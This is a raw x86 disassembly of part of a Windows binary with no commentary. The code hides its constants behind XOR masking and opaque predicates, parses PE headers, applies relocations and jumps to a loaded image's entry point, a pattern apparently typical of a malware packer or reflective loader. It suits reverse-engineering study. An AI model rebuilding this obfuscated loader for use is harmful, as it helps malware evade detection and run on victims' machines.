  425078:	mov    DWORD PTR [ebp-0x1c],eax
  42507b:	mov    DWORD PTR [ebp-0x38],0xf89c85b3
  425082:	mov    DWORD PTR [ebp-0x8],edi
  425085:	mov    eax,DWORD PTR [ebp-0x4c]
  425088:	xor    eax,ebx
  42508a:	add    eax,esi
  42508c:	jmp    0x42517f
  425091:	mov    DWORD PTR [ebp-0xe4],0xf89c85bb
  42509b:	mov    DWORD PTR [ebp-0xd0],0xf89c858e
  4250a5:	mov    eax,DWORD PTR [ebp-0x8]
  4250a8:	mov    ecx,DWORD PTR [ebp-0x18]
  4250ab:	xor    eax,ebx
  4250ad:	add    eax,esi
  4250af:	imul   eax,ecx
  4250b2:	mov    ecx,DWORD PTR [ebp-0x1c]
  4250b5:	mov    al,BYTE PTR [eax+ecx*1]
  4250b8:	mov    BYTE PTR [ebp-0x1],al
  4250bb:	mov    eax,DWORD PTR [ebp-0x8]
  4250be:	mov    ecx,DWORD PTR [ebp-0x18]
  4250c1:	xor    eax,ebx
  4250c3:	add    eax,esi
  4250c5:	imul   eax,ecx
  4250c8:	mov    ecx,DWORD PTR [ebp-0x54]
  4250cb:	xor    ecx,ebx
  4250cd:	add    eax,ecx
  4250cf:	mov    ecx,DWORD PTR [ebp-0x1c]
  4250d2:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272ec]
  4250da:	mov    ecx,DWORD PTR [ebp-0xe4]
  4250e0:	xor    ecx,ebx
  4250e2:	lea    eax,[ecx+eax*1+0x3272ec]
  4250e9:	movzx  ecx,BYTE PTR [ebp-0x1]
  4250ed:	xor    ecx,eax
  4250ef:	mov    BYTE PTR [ebp-0x1],cl
  4250f2:	mov    al,BYTE PTR [ebp-0x1]
  4250f5:	mov    ecx,DWORD PTR [ebp-0x8]
  4250f8:	mov    edx,DWORD PTR [ebp-0x18]
  4250fb:	xor    ecx,ebx
  4250fd:	add    ecx,esi
  4250ff:	imul   ecx,edx
  425102:	mov    edx,DWORD PTR [ebp-0x1c]
  425105:	mov    BYTE PTR [ecx+edx*1],al
  425108:	mov    eax,DWORD PTR [ebp-0x8]
  42510b:	mov    ecx,DWORD PTR [ebp-0x18]
  42510e:	xor    eax,ebx
  425110:	add    eax,esi
  425112:	imul   eax,ecx
  425115:	mov    ecx,DWORD PTR [ebp-0x1c]
  425118:	mov    al,BYTE PTR [eax+ecx*1]
  42511b:	mov    BYTE PTR [ebp-0x1],al
  42511e:	mov    eax,DWORD PTR [ebp-0x8]
  425121:	mov    ecx,DWORD PTR [ebp-0x18]
  425124:	xor    eax,ebx
  425126:	add    eax,esi
  425128:	imul   eax,ecx
  42512b:	mov    ecx,DWORD PTR [ebp-0x14]
  42512e:	xor    ecx,ebx
  425130:	add    eax,ecx
  425132:	mov    ecx,DWORD PTR [ebp-0x1c]
  425135:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272ec]
  42513d:	mov    ecx,DWORD PTR [ebp-0xd0]
  425143:	xor    ecx,ebx
  425145:	lea    eax,[ecx+eax*1+0x3272ec]
  42514c:	movzx  ecx,BYTE PTR [ebp-0x1]
  425150:	xor    ecx,eax
  425152:	mov    BYTE PTR [ebp-0x1],cl
  425155:	mov    al,BYTE PTR [ebp-0x1]
  425158:	mov    ecx,DWORD PTR [ebp-0x8]
  42515b:	mov    edx,DWORD PTR [ebp-0x18]
  42515e:	xor    ecx,ebx
  425160:	add    ecx,esi
  425162:	imul   ecx,edx
  425165:	mov    edx,DWORD PTR [ebp-0x1c]
  425168:	mov    BYTE PTR [ecx+edx*1],al
  42516b:	mov    eax,DWORD PTR [ebp-0x38]
  42516e:	mov    ecx,DWORD PTR [ebp-0x14]
  425171:	xor    eax,ebx
  425173:	xor    ecx,ebx
  425175:	add    eax,esi
  425177:	add    ecx,esi
  425179:	imul   eax,ecx
  42517c:	add    eax,DWORD PTR [ebp-0x18]
  42517f:	mov    DWORD PTR [ebp-0x18],eax
  425182:	mov    eax,DWORD PTR [ebp-0x18]
  425185:	mov    ecx,DWORD PTR [ebp-0x20]
  425188:	cmp    ecx,eax
  42518a:	jb     0x425091
  425190:	mov    eax,DWORD PTR [ebp-0x14]
  425193:	mov    ecx,DWORD PTR [ebp-0x20]
  425196:	xor    eax,ebx
  425198:	add    eax,esi
  42519a:	imul   eax,ecx
  42519d:	mov    ecx,DWORD PTR [ebp-0x4c]
  4251a0:	xor    ecx,ebx
  4251a2:	add    ecx,esi
  4251a4:	or     eax,ecx
  4251a6:	mov    ecx,DWORD PTR [ebp-0x30]
  4251a9:	xor    ecx,ebx
  4251ab:	add    eax,ecx
  4251ad:	mov    ecx,DWORD PTR [ebp-0x30]
  4251b0:	xor    ecx,ebx
  4251b2:	add    eax,ecx
  4251b4:	mov    ecx,DWORD PTR [ebp-0xc]
  4251b7:	lea    eax,[eax+ecx*1+0x64e5d8]
  4251be:	jmp    0x4251cf
  4251c0:	mov    eax,DWORD PTR [ebp-0x30]
  4251c3:	mov    ecx,DWORD PTR [ebp-0xc]
  4251c6:	xor    eax,ebx
  4251c8:	lea    eax,[eax+ecx*1+0x3272ec]
  4251cf:	mov    DWORD PTR [ebp-0xc],eax
  4251d2:	mov    eax,DWORD PTR [ebp-0x30]
  4251d5:	xor    eax,ebx
  4251d7:	mov    ecx,0xffcd8d14
  4251dc:	sub    ecx,eax
  4251de:	add    ecx,DWORD PTR [ebp-0x34]
  4251e1:	mov    eax,DWORD PTR [ebp-0x30]
  4251e4:	mov    edx,DWORD PTR [ebp-0xc]
  4251e7:	xor    eax,ebx
  4251e9:	add    eax,esi
  4251eb:	imul   eax,edx
  4251ee:	cmp    eax,ecx
  4251f0:	jbe    0x42500b
  4251f6:	push   DWORD PTR [ebp+0x8]
  4251f9:	mov    eax,DWORD PTR [ebp+0x8]
  4251fc:	push   DWORD PTR [eax+0x1cc]
  425202:	lea    eax,[ebp-0xd8]
  425208:	push   eax
  425209:	mov    eax,DWORD PTR [ebp+0x8]
  42520c:	mov    eax,DWORD PTR [eax+0x1c4]
  425212:	push   DWORD PTR [eax]
  425214:	mov    eax,DWORD PTR [ebp+0x8]
  425217:	mov    eax,DWORD PTR [eax+0x1c0]
  42521d:	push   DWORD PTR [eax]
  42521f:	push   DWORD PTR [ebp-0x3c]
  425222:	push   DWORD PTR [ebp-0x2c]
  425225:	call   0x425cbc
  42522a:	mov    DWORD PTR [ebp-0x40],eax
  42522d:	mov    eax,DWORD PTR [ebp-0x10]
  425230:	mov    ecx,DWORD PTR [ebp-0x2c]
  425233:	xor    eax,ebx
  425235:	add    eax,esi
  425237:	cmp    eax,ecx
  425239:	je     0x42525a
  42523b:	mov    eax,DWORD PTR [ebp+0x8]
  42523e:	mov    ecx,DWORD PTR [ebp-0x50]
  425241:	mov    eax,DWORD PTR [eax+0x1d8]
  425247:	xor    ecx,ebx
  425249:	add    ecx,esi
  42524b:	push   ecx
  42524c:	mov    ecx,DWORD PTR [ebp-0x10]
  42524f:	xor    ecx,ebx
  425251:	add    ecx,esi
  425253:	push   ecx
  425254:	push   DWORD PTR [ebp-0x2c]
  425257:	call   DWORD PTR [eax+0x18]
  42525a:	pop    edi
  42525b:	pop    esi
  42525c:	pop    ebx
  42525d:	leave  
  42525e:	ret    0x4
  425261:	push   ebp
  425262:	mov    ebp,esp
  425264:	push   ecx
  425265:	push   ecx
  425266:	lea    eax,[ebp-0x8]
  425269:	mov    DWORD PTR [ebp-0x4],eax
  42526c:	push   esi
  42526d:	mov    esi,DWORD PTR [ebp-0x4]
  425270:	mov    eax,0xf881ba2e
  425275:	mov    DWORD PTR [esi],eax
  425277:	mov    esi,DWORD PTR [ebp-0x8]
  42527a:	cmp    esi,eax
  42527c:	pop    esi
  42527d:	jne    0x425287
  42527f:	mov    BYTE PTR [ecx+0xa],0x7a
  425283:	mov    BYTE PTR [edx+0x8],0x2f
  425287:	mov    BYTE PTR [edx+0xa],0x7a
  42528b:	mov    BYTE PTR [ecx+0x2],0x8
  42528f:	leave  
  425290:	ret    
  425291:	push   ebp
  425292:	mov    ebp,esp
  425294:	push   ecx
  425295:	push   ecx
  425296:	lea    eax,[ebp-0x8]
  425299:	mov    DWORD PTR [ebp-0x4],eax
  42529c:	mov    edx,DWORD PTR [ebp-0x4]
  42529f:	mov    eax,0xf88b0bca
  4252a4:	mov    DWORD PTR [edx],eax
  4252a6:	mov    edx,DWORD PTR [ebp-0x8]
  4252a9:	cmp    edx,eax
  4252ab:	jne    0x4252bc
  4252ad:	mov    eax,DWORD PTR [ebp+0x8]
  4252b0:	mov    BYTE PTR [ecx+0x9],0xe
  4252b4:	mov    BYTE PTR [eax+0x7],0x57
  4252b8:	mov    BYTE PTR [ecx+0x6],0xf
  4252bc:	mov    BYTE PTR [ecx+0x3],0x1e
  4252c0:	leave  
  4252c1:	ret    0x4
  4252c4:	push   ebp
  4252c5:	mov    ebp,esp
  4252c7:	push   ecx
  4252c8:	push   ecx
  4252c9:	lea    eax,[ebp-0x8]
  4252cc:	mov    DWORD PTR [ebp-0x4],eax
  4252cf:	mov    edx,DWORD PTR [ebp-0x4]
  4252d2:	mov    eax,0x7e0da2e
  4252d7:	mov    DWORD PTR [edx],eax
  4252d9:	mov    edx,DWORD PTR [ebp-0x8]
  4252dc:	cmp    edx,eax
  4252de:	jne    0x4252e4
  4252e0:	mov    BYTE PTR [ecx+0x7],0x57
  4252e4:	mov    eax,DWORD PTR [ebp+0x8]
  4252e7:	mov    BYTE PTR [ecx+0x1],0x15
  4252eb:	mov    BYTE PTR [eax+0x9],0x2e
  4252ef:	leave  
  4252f0:	ret    0x4
  4252f3:	push   ebp
  4252f4:	mov    ebp,esp
  4252f6:	push   ecx
  4252f7:	push   ecx
  4252f8:	lea    eax,[ebp-0x8]
  4252fb:	mov    DWORD PTR [ebp-0x4],eax
  4252fe:	push   esi
  4252ff:	mov    esi,DWORD PTR [ebp-0x4]
  425302:	mov    eax,0x7060e3f
  425307:	mov    DWORD PTR [esi],eax
  425309:	mov    esi,DWORD PTR [ebp-0x8]
  42530c:	cmp    esi,eax
  42530e:	pop    esi
  42530f:	jne    0x42531b
  425311:	mov    BYTE PTR [edx+0x4],0xb
  425315:	mov    WORD PTR [ecx+0x3],0xb1e
  42531b:	mov    BYTE PTR [edx],0x3f
  42531e:	leave  
  42531f:	ret    
  425320:	push   ebp
  425321:	mov    ebp,esp
  425323:	push   ecx
  425324:	push   ecx
  425325:	lea    eax,[ebp-0x8]
  425328:	mov    DWORD PTR [ebp-0x4],eax
  42532b:	mov    edx,DWORD PTR [ebp-0x4]
  42532e:	mov    eax,0xf8870b3e
  425333:	mov    DWORD PTR [edx],eax
  425335:	mov    edx,DWORD PTR [ebp-0x8]
  425338:	cmp    edx,eax
  42533a:	jne    0x425347
  42533c:	mov    eax,DWORD PTR [ebp+0x8]
  42533f:	mov    BYTE PTR [ecx+0x8],0xf
  425343:	mov    BYTE PTR [eax+0x1],0x15
  425347:	mov    BYTE PTR [ecx+0x5],0x3
  42534b:	leave  
  42534c:	ret    0x4
  42534f:	push   esi
  425350:	mov    ecx,edi
  425352:	call   0x425320
  425357:	mov    edx,edi
  425359:	mov    ecx,esi
  42535b:	mov    BYTE PTR [esi],0x1f
  42535e:	call   0x4252f3
  425363:	push   esi
  425364:	mov    ecx,edi
  425366:	mov    BYTE PTR [esi+0x5],0x3
  42536a:	call   0x4252c4
  42536f:	push   esi
  425370:	mov    BYTE PTR [esi+0x6],0xf
  425374:	call   0x425291
  425379:	mov    BYTE PTR [esi+0x2],0x8
  42537d:	mov    edx,esi
  42537f:	jmp    0x425261
  425384:	push   ebp
  425385:	mov    ebp,esp
  425387:	push   ecx
  425388:	mov    ecx,DWORD PTR [edx+0x194]
  42538e:	push   esi
  42538f:	mov    esi,DWORD PTR [ebp+0x8]
  425392:	mov    esi,DWORD PTR [esi]
  425394:	mov    DWORD PTR [ecx],esi
  425396:	mov    ecx,DWORD PTR [edx+0x194]
  42539c:	mov    ecx,DWORD PTR [ecx]
  42539e:	mov    esi,DWORD PTR [edx+0x190]
  4253a4:	mov    DWORD PTR [esi],ecx
  4253a6:	mov    eax,DWORD PTR [edx+0x194]
  4253ac:	mov    ecx,DWORD PTR [eax]
  4253ae:	mov    ecx,DWORD PTR [ecx+0x3c]
  4253b1:	add    ecx,DWORD PTR [eax]
  4253b3:	mov    DWORD PTR [ebp-0x4],0xf89ca5b0
  4253ba:	mov    eax,DWORD PTR [ebp-0x4]
  4253bd:	movzx  ecx,WORD PTR [ecx+0x16]
  4253c1:	xor    eax,0x75108a4
  4253c6:	add    eax,0x3272ec
  4253cb:	pop    esi
  4253cc:	test   ecx,eax
  4253ce:	je     0x4253dc
  4253d0:	mov    eax,DWORD PTR [edx+0x1c8]
  4253d6:	mov    DWORD PTR [eax],0xf89c85b1
  4253dc:	leave  
  4253dd:	ret    0x4
  4253e0:	push   ebp
  4253e1:	mov    ebp,esp
  4253e3:	sub    esp,0x70
  4253e6:	and    DWORD PTR [ebp-0x20],0x0
  4253ea:	mov    DWORD PTR [ebp-0x18],0xf89cb5b0
  4253f1:	mov    DWORD PTR [ebp-0x1c],0xf89c85f0
  4253f8:	mov    DWORD PTR [ebp-0x2c],0xf89c85bc
  4253ff:	mov    DWORD PTR [ebp-0x14],0xf89c85b2
  425406:	mov    DWORD PTR [ebp-0x2c],0xf89f05b0
  42540d:	mov    eax,DWORD PTR [ebp+0x20]
  425410:	mov    eax,DWORD PTR [eax+0x194]
  425416:	mov    DWORD PTR [ebp-0xc],eax
  425419:	mov    eax,DWORD PTR [ebp+0x20]
  42541c:	push   ebx
  42541d:	push   esi
  42541e:	mov    esi,DWORD PTR [eax+0x190]
  425424:	mov    eax,DWORD PTR [ebp+0x20]
  425427:	mov    eax,DWORD PTR [eax+0x18c]
  42542d:	mov    DWORD PTR [ebp-0x8],eax
  425430:	mov    eax,DWORD PTR [eax]
  425432:	push   edi
  425433:	mov    DWORD PTR [ebp-0x4],esi
  425436:	test   eax,eax
  425438:	jne    0x425445
  42543a:	push   DWORD PTR [ebp+0x1c]
  42543d:	mov    edx,DWORD PTR [ebp+0x20]
  425440:	call   0x425384
  425445:	mov    eax,DWORD PTR [esi]
  425447:	mov    ebx,DWORD PTR [esi]
  425449:	add    ebx,DWORD PTR [eax+0x3c]
  42544c:	mov    eax,DWORD PTR [ebp+0xc]
  42544f:	mov    ecx,DWORD PTR [ebp-0x8]
  425452:	mov    ecx,DWORD PTR [ecx]
  425454:	mov    esi,0x75108a4
  425459:	xor    eax,esi
  42545b:	mov    edi,0x3272ec
  425460:	add    eax,edi
  425462:	cmp    eax,ecx
  425464:	jne    0x42569c
  42546a:	mov    eax,DWORD PTR [ebp-0xc]
  42546d:	mov    eax,DWORD PTR [eax]
  42546f:	mov    DWORD PTR [ebp-0x10],eax
  425472:	mov    eax,DWORD PTR [ebx+0x50]
  425475:	mov    DWORD PTR [ebp-0x68],eax
  425478:	mov    eax,DWORD PTR [ebp-0x18]
  42547b:	xor    eax,esi
  42547d:	add    eax,edi
  42547f:	mov    DWORD PTR [ebp-0x64],eax
  425482:	mov    eax,DWORD PTR [ebp-0x14]
  425485:	and    DWORD PTR [ebp-0x6c],0x0
  425489:	xor    eax,esi
  42548b:	add    eax,edi
  42548d:	mov    DWORD PTR [ebp-0x60],eax
  425490:	lea    eax,[ebp-0x70]
  425493:	push   eax
  425494:	mov    eax,DWORD PTR [ebp+0x8]
  425497:	xor    eax,esi
  425499:	add    eax,edi
  42549b:	push   eax
  42549c:	mov    eax,DWORD PTR [ebp+0x20]
  42549f:	add    eax,0xaa
  4254a4:	push   eax
  4254a5:	mov    eax,DWORD PTR [ebp+0x20]
  4254a8:	mov    eax,DWORD PTR [eax+0x198]
  4254ae:	mov    DWORD PTR [ebp-0x70],0x4
  4254b5:	push   DWORD PTR [eax]
  4254b7:	mov    eax,DWORD PTR [ebp+0x10]
  4254ba:	call   eax
  4254bc:	mov    ecx,DWORD PTR [ebp-0xc]
  4254bf:	mov    ecx,DWORD PTR [ecx]
  4254c1:	mov    edx,DWORD PTR [ebp-0x8]
  4254c4:	mov    DWORD PTR [ebp-0x6c],eax
  4254c7:	mov    DWORD PTR [ebp+0x1c],eax
  4254ca:	mov    DWORD PTR [edx],ecx
  4254cc:	mov    ecx,DWORD PTR [ebp-0x4]
  4254cf:	mov    DWORD PTR [ecx],eax
  4254d1:	mov    eax,DWORD PTR [ebx+0x50]
  4254d4:	mov    DWORD PTR [ebp-0x68],eax
  4254d7:	mov    eax,DWORD PTR [ebp-0x1c]
  4254da:	xor    eax,esi
  4254dc:	add    eax,edi
  4254de:	mov    DWORD PTR [ebp-0x64],eax
  4254e1:	lea    eax,[ebp-0x20]
  4254e4:	mov    DWORD PTR [ebp-0x60],eax
  4254e7:	lea    eax,[ebp-0x70]
  4254ea:	push   eax
  4254eb:	mov    eax,DWORD PTR [ebp+0x8]
  4254ee:	xor    eax,esi
  4254f0:	add    eax,edi
  4254f2:	push   eax
  4254f3:	mov    eax,DWORD PTR [ebp+0x20]
  4254f6:	add    eax,0xee
  4254fb:	push   eax
  4254fc:	mov    eax,DWORD PTR [ebp+0x20]
  4254ff:	mov    eax,DWORD PTR [eax+0x198]
  425505:	mov    DWORD PTR [ebp-0x70],0x4
  42550c:	push   DWORD PTR [eax]
  42550e:	mov    eax,DWORD PTR [ebp+0x10]
  425511:	call   eax
  425513:	test   eax,eax
  425515:	je     0x42553a
  425517:	and    DWORD PTR [ebp+0xc],0x0
  42551b:	cmp    DWORD PTR [ebx+0x50],0x0
  42551f:	jbe    0x42553a
  425521:	mov    eax,DWORD PTR [ebp+0x1c]
  425524:	mov    ecx,DWORD PTR [ebp-0x10]
  425527:	sub    ecx,eax
  425529:	mov    dl,BYTE PTR [ecx+eax*1]
  42552c:	inc    DWORD PTR [ebp+0xc]
  42552f:	mov    BYTE PTR [eax],dl
  425531:	mov    edx,DWORD PTR [ebp+0xc]
  425534:	inc    eax
  425535:	cmp    edx,DWORD PTR [ebx+0x50]
  425538:	jb     0x425529
  42553a:	mov    edx,DWORD PTR [ebp+0x1c]
  42553d:	mov    ecx,DWORD PTR [edx+0x3c]
  425540:	add    ecx,edx
  425542:	mov    eax,DWORD PTR [ecx+0xa0]
  425548:	mov    ebx,DWORD PTR [ecx+0x28]
  42554b:	add    eax,edx
  42554d:	sub    edx,DWORD PTR [ebp-0x10]
  425550:	add    ebx,DWORD PTR [ebp+0x1c]
  425553:	mov    DWORD PTR [ebp+0xc],edx
  425556:	mov    DWORD PTR [ebp-0x2c],ecx
  425559:	mov    DWORD PTR [ebp-0x14],ebx
  42555c:	mov    DWORD PTR [ebp-0x8],0x0
  425563:	jmp    0x4255df
  425565:	add    edx,0xfffffff8
  425568:	shr    edx,1
  42556a:	mov    DWORD PTR [ebp-0x18],edx
  42556d:	je     0x4255cb
  42556f:	lea    edx,[eax+0x8]
  425572:	mov    DWORD PTR [ebp-0x4],edx
  425575:	mov    edx,DWORD PTR [ebp-0x18]
  425578:	mov    DWORD PTR [ebp-0x18],edx
  42557b:	mov    edx,DWORD PTR [ebp-0x4]
  42557e:	movzx  edx,WORD PTR [edx]
  425581:	mov    DWORD PTR [ebp-0x24],edx
  425584:	and    edx,0xfff
  42558a:	mov    DWORD PTR [ebp-0x28],edx
  42558d:	mov    edx,DWORD PTR [ebp-0x24]
  425590:	shr    edx,0xc
  425593:	add    edx,0xffcd8d14
  425599:	xor    edx,esi
  42559b:	cmp    edx,0xf89c85b3
  4255a1:	jne    0x4255c2
  4255a3:	mov    edx,DWORD PTR [ebp-0x28]
  4255a6:	add    edx,DWORD PTR [ebp+0x1c]
  4255a9:	mov    ebx,DWORD PTR [eax]
  4255ab:	cmp    DWORD PTR [ebx+edx*1],0x0
  4255af:	je     0x4255bf
  4255b1:	mov    ecx,DWORD PTR [ebp+0xc]
  4255b4:	add    ecx,DWORD PTR [ebx+edx*1]
  4255b7:	mov    ebx,DWORD PTR [eax]
  4255b9:	mov    DWORD PTR [edx+ebx*1],ecx
  4255bc:	mov    ecx,DWORD PTR [ebp-0x2c]
  4255bf:	mov    ebx,DWORD PTR [ebp-0x14]
  4255c2:	add    DWORD PTR [ebp-0x4],0x2
  4255c6:	dec    DWORD PTR [ebp-0x18]
  4255c9:	jne    0x42557b
  4255cb:	mov    edx,DWORD PTR [ebp-0xc]
  4255ce:	add    DWORD PTR [ebp-0x8],edx
  4255d1:	mov    edx,DWORD PTR [ebp-0x8]
  4255d4:	cmp    edx,DWORD PTR [ecx+0xa4]
  4255da:	jae    0x4255ed
  4255dc:	add    eax,DWORD PTR [ebp-0xc]
  4255df:	mov    edx,DWORD PTR [eax+0x4]
  4255e2:	mov    DWORD PTR [ebp-0xc],edx
  4255e5:	test   edx,edx
  4255e7:	jne    0x425565
  4255ed:	mov    eax,DWORD PTR [ebp-0x10]
  4255f0:	mov    DWORD PTR [ebp-0x6c],eax
  4255f3:	mov    DWORD PTR [ebp-0x70],0x4
  4255fa:	mov    eax,DWORD PTR [ecx+0x50]
  4255fd:	mov    DWORD PTR [ebp-0x68],eax
  425600:	mov    eax,DWORD PTR [ebp-0x1c]
  425603:	xor    eax,esi
  425605:	add    eax,edi
  425607:	mov    DWORD PTR [ebp-0x64],eax
  42560a:	lea    eax,[ebp-0x20]
  42560d:	mov    DWORD PTR [ebp-0x60],eax
  425610:	lea    eax,[ebp-0x70]
  425613:	push   eax
  425614:	mov    eax,DWORD PTR [ebp+0x8]
  425617:	xor    eax,esi
  425619:	add    eax,edi
  42561b:	push   eax
  42561c:	mov    eax,DWORD PTR [ebp+0x20]
  42561f:	add    eax,0xee
  425624:	push   eax
  425625:	mov    eax,DWORD PTR [ebp+0x20]
  425628:	mov    eax,DWORD PTR [eax+0x198]
  42562e:	push   DWORD PTR [eax]
  425630:	mov    eax,DWORD PTR [ebp+0x10]
  425633:	call   eax
  425635:	mov    eax,DWORD PTR [ebp+0x20]
  425638:	mov    eax,DWORD PTR [eax+0x180]
  42563e:	add    eax,DWORD PTR [ebp+0xc]
  425641:	mov    ecx,DWORD PTR [ebp+0xc]
  425644:	push   DWORD PTR [ebp+0x18]
  425647:	mov    DWORD PTR [eax],ecx
  425649:	push   DWORD PTR [ebp+0x14]
  42564c:	push   DWORD PTR [ebp+0x1c]
  42564f:	call   ebx
  425651:	mov    ecx,DWORD PTR [ebp+0xc]
  425654:	add    ecx,DWORD PTR [ebp+0x20]
  425657:	lea    eax,[ebp+0x4]
  42565a:	mov    DWORD PTR [ebp+0x20],ecx
  42565d:	mov    ecx,DWORD PTR [ebp+0x20]
  425660:	mov    ecx,DWORD PTR [ebp+0x20]
  425663:	mov    edx,DWORD PTR [ecx+0x190]
  425669:	mov    ecx,DWORD PTR [ebp+0x20]
  42566c:	mov    ecx,DWORD PTR [ecx+0x18c]
  425672:	mov    esi,DWORD PTR [ecx]
  425674:	cmp    DWORD PTR [eax],esi
  425676:	jb     0x425697
  425678:	mov    esi,DWORD PTR [edx]
  42567a:	mov    edi,DWORD PTR [edx]
  42567c:	mov    esi,DWORD PTR [esi+0x3c]
  42567f:	lea    esi,[edi+esi*1+0x50]
  425683:	mov    edi,DWORD PTR [ecx]
  425685:	add    edi,DWORD PTR [esi]
  425687:	cmp    DWORD PTR [eax],edi
  425689:	jae    0x425697
  42568b:	mov    esi,DWORD PTR [ecx]
  42568d:	mov    ecx,DWORD PTR [eax]
  42568f:	mov    edx,DWORD PTR [edx]
  425691:	sub    ecx,esi
  425693:	add    edx,ecx
  425695:	mov    DWORD PTR [eax],edx
  425697:	mov    eax,DWORD PTR [ebp+0xc]
  42569a:	jmp    0x42569e
  42569c:	xor    eax,eax
  42569e:	pop    edi
  42569f:	pop    esi
  4256a0:	pop    ebx
  4256a1:	leave  
  4256a2:	ret    0x1c
  4256a5:	push   ebp
  4256a6:	mov    ebp,esp
  4256a8:	sub    esp,0x1c
  4256ab:	push   esi
  4256ac:	mov    esi,eax
  4256ae:	mov    eax,DWORD PTR [ecx+0x190]
  4256b4:	cmp    DWORD PTR [eax],0x0
  4256b7:	je     0x4257c7
  4256bd:	test   edx,edx
  4256bf:	je     0x4257c7
  4256c5:	test   esi,esi
  4256c7:	je     0x4257c7
  4256cd:	mov    eax,DWORD PTR [esi+0x88]
  4256d3:	test   eax,eax
  4256d5:	je     0x4257c2
  4256db:	cmp    DWORD PTR [esi+0x8c],0x10
  4256e2:	je     0x4257c2
  4256e8:	cmp    DWORD PTR [esi+0x34],edx
  4256eb:	je     0x4257c2
  4256f1:	mov    esi,DWORD PTR [ecx+0x18c]
  4256f7:	and    DWORD PTR [ebp-0x10],0x0
  4256fb:	mov    ecx,edx
  4256fd:	sub    ecx,DWORD PTR [esi]
  4256ff:	add    eax,edx
  425701:	movzx  edx,WORD PTR [eax+0xc]
  425705:	mov    DWORD PTR [ebp-0x1c],ecx
  425708:	movzx  ecx,WORD PTR [eax+0xe]
  42570c:	add    ecx,edx
  42570e:	je     0x4257c2
  425714:	lea    ecx,[eax+0x14]
  425717:	push   ebx
  425718:	mov    DWORD PTR [ebp-0x18],ecx
  42571b:	mov    esi,0x7fffffff
  425720:	push   edi
  425721:	test   DWORD PTR [ecx],esi
  425723:	je     0x4257a4
  425725:	mov    edx,DWORD PTR [ecx]
  425727:	and    DWORD PTR [ebp-0xc],0x0
  42572b:	and    edx,esi
  42572d:	add    edx,eax
  42572f:	movzx  edi,WORD PTR [edx+0xe]
  425733:	movzx  ebx,WORD PTR [edx+0xc]
  425737:	add    edi,ebx
  425739:	je     0x4257a4
  42573b:	lea    ecx,[edx+0x14]
  42573e:	mov    DWORD PTR [ebp-0x14],ecx
  425741:	test   DWORD PTR [ecx],esi
  425743:	je     0x425786
  425745:	mov    ecx,DWORD PTR [ecx]
  425747:	and    DWORD PTR [ebp-0x8],0x0
  42574b:	and    ecx,esi
  42574d:	add    ecx,eax
  42574f:	movzx  edi,WORD PTR [ecx+0xe]
  425753:	movzx  ebx,WORD PTR [ecx+0xc]
  425757:	add    edi,ebx
  425759:	je     0x425786
  42575b:	lea    edi,[ecx+0x14]
  42575e:	mov    DWORD PTR [ebp-0x4],edi
  425761:	mov    edi,DWORD PTR [ebp-0x4]
  425764:	mov    edi,DWORD PTR [edi]
  425766:	test   edi,edi
  425768:	je     0x425770
  42576a:	mov    ebx,DWORD PTR [ebp-0x1c]
  42576d:	add    DWORD PTR [edi+eax*1],ebx
  425770:	movzx  edi,WORD PTR [ecx+0xe]
  425774:	movzx  ebx,WORD PTR [ecx+0xc]
  425778:	inc    DWORD PTR [ebp-0x8]
  42577b:	add    DWORD PTR [ebp-0x4],0x8
  42577f:	add    edi,ebx
  425781:	cmp    DWORD PTR [ebp-0x8],edi
  425784:	jb     0x425761
  425786:	movzx  edi,WORD PTR [edx+0xe]
  42578a:	movzx  ebx,WORD PTR [edx+0xc]
  42578e:	mov    ecx,DWORD PTR [ebp-0x14]
  425791:	inc    DWORD PTR [ebp-0xc]
  425794:	add    ecx,0x8
  425797:	add    edi,ebx
  425799:	mov    DWORD PTR [ebp-0x14],ecx
  42579c:	cmp    DWORD PTR [ebp-0xc],edi
  42579f:	jb     0x425741
  4257a1:	mov    ecx,DWORD PTR [ebp-0x18]
  4257a4:	movzx  edx,WORD PTR [eax+0xe]
  4257a8:	movzx  edi,WORD PTR [eax+0xc]
  4257ac:	inc    DWORD PTR [ebp-0x10]
  4257af:	add    ecx,0x8
  4257b2:	add    edx,edi
  4257b4:	mov    DWORD PTR [ebp-0x18],ecx
  4257b7:	cmp    DWORD PTR [ebp-0x10],edx
  4257ba:	jb     0x425721
  4257c0:	pop    edi
  4257c1:	pop    ebx
  4257c2:	xor    eax,eax
  4257c4:	inc    eax
  4257c5:	jmp    0x4257c9
  4257c7:	xor    eax,eax
  4257c9:	pop    esi
  4257ca:	leave  
  4257cb:	ret    
  4257cc:	push   ebp
  4257cd:	mov    ebp,esp
  4257cf:	mov    ecx,DWORD PTR [ecx+0x190]
  4257d5:	mov    eax,DWORD PTR [ebp+0xc]
  4257d8:	sub    esp,0x10
  4257db:	push   ebx
  4257dc:	xor    ebx,ebx
  4257de:	push   esi
  4257df:	push   edi
  4257e0:	cmp    DWORD PTR [ecx],ebx
  4257e2:	je     0x42586a
  4257e8:	cmp    eax,ebx
  4257ea:	je     0x42586a
  4257ec:	cmp    DWORD PTR [eax+0x78],ebx
  4257ef:	jne    0x4257f6
  4257f1:	xor    eax,eax
  4257f3:	inc    eax
  4257f4:	jmp    0x42586c
  4257f6:	mov    eax,DWORD PTR [eax+0x78]
  4257f9:	add    eax,DWORD PTR [ebp+0x8]
  4257fc:	mov    ecx,DWORD PTR [eax+0x1c]
  4257ff:	mov    edx,DWORD PTR [eax+0x24]
  425802:	mov    esi,DWORD PTR [eax+0x14]
  425805:	mov    edi,DWORD PTR [eax+0x18]
  425808:	add    ecx,DWORD PTR [ebp+0x8]
  42580b:	add    edx,DWORD PTR [ebp+0x8]
  42580e:	mov    DWORD PTR [ebp-0x4],esi
  425811:	cmp    esi,edi
  425813:	ja     0x425818
  425815:	mov    DWORD PTR [ebp-0x4],edi
  425818:	mov    DWORD PTR [ebp-0x8],ebx
  42581b:	cmp    DWORD PTR [ebp-0x4],ebx
  42581e:	jbe    0x4257f1
  425820:	cmp    ebx,DWORD PTR [eax+0x14]
  425823:	jae    0x42582b
  425825:	movzx  esi,WORD PTR [edx+ebx*2]
  425829:	jmp    0x42582d
  42582b:	mov    esi,ebx
  42582d:	lea    esi,[ecx+esi*4]
  425830:	mov    edi,DWORD PTR [esi]
  425832:	test   edi,edi
  425834:	je     0x42585f
  425836:	add    edi,DWORD PTR [ebp+0x8]
  425839:	mov    DWORD PTR [ebp-0x10],edi
  42583c:	cmp    edi,eax
  42583e:	jbe    0x425850
